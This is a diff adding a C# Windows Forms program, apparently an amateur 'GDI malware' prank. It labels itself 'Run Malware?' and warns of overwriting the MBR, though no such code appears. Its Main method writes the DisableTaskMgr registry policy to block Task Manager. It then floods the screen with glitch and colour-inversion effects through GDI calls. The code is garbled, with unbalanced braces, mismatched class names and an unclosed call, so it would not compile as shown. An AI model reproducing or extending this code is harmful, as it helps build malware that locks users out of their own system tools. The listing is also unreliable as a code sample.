@@ -1,0 +1,200 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.Collections.Generic;
+using System.Runtime.ConstrainedExecution;
+using System.Runtime.InteropServices;
+using System.Security;
+using Trythotpaldouledciey.Properties;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+namespace Trythotpaldouledciey
+{
+    public partial class Class1 : Form
+    {
+        public Class1()
+        {
+            InitializeComponent();
+
+        }
+
+        private void Button1_Click(object sender, EventArgs e)
+        {
+            if (MessageBox.Show("Run Malware?", "Trythotpaldouledciey.exe", MessageBoxButtons.OKCancel, MessageBoxIcon.Exclamation) == DialogResult.Ok)
+            {
+                {
+
+                    MessageBox.Show("Are you sure. This will overitge your mbr!");
+                }
+        }
+
+    }
+}
+    
+      
+    static void Main()
+    {
+        Drawer drawer1 = new Drawer1();
+
+        {
+
+            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+            key.Close();
+
+            drawer1.Start(); 
+            Thread.Sleep(12000);
+            drawer1.Stop();
+        }
+    }
+
+    class Drawer1 : Drawer
+    {
+       
+        int redrawCounter = 0;
+
+        public override void Draw(IntPtr hdc)
+        {
+           
+            int blockW = 300;
+            int blockH = 300;
+            int x = random.Next(0, screenW - blockW); 
+            int y = random.Next(0, screenH - blockH);
+
+            BitBlt(hdc, random.Next(-100, 101), y, screenW, blockH, hdc, 0, y, (int)CopyPixelOperation.SourceCopy);
+
+            
+            BitBlt(hdc, x, random.Next(-100, 101), blockW, screenH, hdc, x, 0, (int)CopyPixelOperation.SourceCopy);
+
+            redrawCounter++;
+            if (redrawCounter >= 20)
+            {
+             
+                redrawCounter = 0;
+                Redraw();
+                IntPtr brush = CreateSolidBrush((uint)random.Next(0, 0xffffff + 1));
+                SelectObject(hdc, brush);
+                PatBlt(hdc, 0, 0, screenW, screenH, CopyPixelOperation.PatInvert);
+                DeleteObject(brush);
+            }
+
+            Thread.Sleep(10);
+        }
+    }
+
+    abstract class Drawer
+    {
+        public bool running = false; 
+        public Random random = new Random();
+        public int screenW = Screen.PrimaryScreen.Bounds.Width;
+        public int screenH = Screen.PrimaryScreen.Bounds.Height;
+
+        public void Start()
+        {
+            if (!running)
+            {
+                running = true;
+                new Thread(new ThreadStart(DrawLoop)).Start();
+            }
+        }
+
+        public void Stop()
+        {
+            running = false;
+        }
+
+        void DrawLoop()
+        {
+            while (running)
+            {
+                IntPtr desktop = GetDC(IntPtr.Zero); 
+
+               
+                Draw(desktop);
+
+                ReleaseDC(IntPtr.Zero, desktop
+            }
+        }
+
+        public void Redraw()
+        {
+            RedrawWindow(IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, RedrawWindowFlags.AllChildren | RedrawWindowFlags.Erase | RedrawWindowFlags.Invalidate);
+        }
+
+        public abstract void Draw(IntPtr hdc);
+    }
+
+    #region DLLImports
+
+    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
+    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);
+    [DllImport("gdi32.dll")]
+    static extern IntPtr CreateSolidBrush(uint crColor);
+    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    public static extern bool DeleteObject([In] IntPtr hObject);
+    [DllImport("user32.dll", SetLastError = true)]
+    static extern IntPtr GetDC(IntPtr hWnd);
+    [DllImport("user32.dll")]
+    static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);
+    [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);
+    [DllImport("gdi32.dll")]
+    static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);
+    [DllImport("user32.dll")]
+    static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);
+    [Flags()]
+    private enum RedrawWindowFlags : uint
+    {
+        
+        Invalidate = 0x1,
+
+     
+        InternalPaint = 0x2,
+
+       
+        Erase = 0x4,
+
+       
+        Validate = 0x8,
+
+        NoInternalPaint = 0x10,
+
+       
+        NoErase = 0x20,
+
+        NoChildren = 0x40,
+
+       
+        AllChildren = 0x80,
+
+      
+        UpdateNow = 0x100,
+
+       
+        EraseNow = 0x200,
+
+        Frame = 0x400,
+
+        NoFrame = 0x800
+    }
+
+    #endregion
+{
+                   }
+                
+            }
+      }
+}
+();
